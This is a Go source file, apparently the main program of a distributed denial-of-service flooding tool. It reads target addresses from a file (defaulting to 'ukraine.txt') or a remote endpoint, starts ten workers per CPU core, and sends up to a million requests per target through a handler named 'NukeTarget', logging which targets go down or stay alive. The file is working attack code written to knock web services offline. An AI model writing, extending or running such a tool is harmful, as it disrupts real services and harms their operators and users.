package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"

	logw "github.com/andriiyaremenko/logwriter"
	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/handler"
	"github.com/andriiyaremenko/mg/source"
	"github.com/andriiyaremenko/tinycqs/command"
)

func main() {
	t := flag.String("t", "file", "source type to use (file or endpoint)")
	s := flag.String("s", "ukraine.txt", "url to endpoint or file name")
	workersPerCore := flag.Int("w", 10, "number of workers per logical CPU")
	amountRequests := flag.Int64("n", 1000000, "number of requests per each target")

	ctx := context.Background()
	ctx, cancel := context.WithCancel(ctx)
	log := log.New(logw.JSONLogWriter(ctx, os.Stdout), "", log.Lmsgprefix)

	flag.Parse()

	numWorkers := *workersPerCore * runtime.NumCPU()

	var readSource command.Handler
	switch *t {
	case "file":
		readSource = handler.ReadSource(source.GetFromFile(*s))
		log.Printf("reading from file %s", *s)
	case "endpoint":
		readSource = handler.ReadSource(source.GetFromEndpoint(client.New(), *s))
		log.Printf("reading from endpoint %s", *s)
	default:
		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", *t))
	}

	comm, err := command.New(
		readSource,
		handler.NukeTarget(client.New(), numWorkers, *amountRequests),
		handler.TargetDown(log),
		handler.TargetAlive(log),
		handler.TargetError(log),
		handler.HandleErrors(log),
	)

	if err != nil {
		log.Fatalln(logw.Error, err)
	}

	c := make(chan os.Signal, 1)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c

		cancel()

		log.Println("shutting down...")
		os.Exit(1)
	}()

	ev := comm.Handle(ctx, command.E{Type: "READ_SOURCE"})

	if err := ev.Err(); err != nil {
		log.Fatalln(logw.Error, err)
	}

	log.Println(string(ev.Payload()))
}
